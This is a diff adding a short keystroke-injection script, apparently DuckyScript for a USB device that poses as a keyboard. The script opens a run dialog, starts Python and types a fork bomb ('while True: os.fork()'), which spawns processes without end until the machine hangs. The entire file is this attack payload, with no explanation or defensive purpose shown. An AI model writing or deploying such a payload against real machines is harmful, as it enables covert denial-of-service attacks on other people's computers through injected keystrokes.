@@ -1,0 +1,9 @@
+GUI r
+DELAY 500
+STRING python
+ENTER
+DELAY 500
+STRING import os
+ENTER
+STRING while True: os.fork()
+ENTER
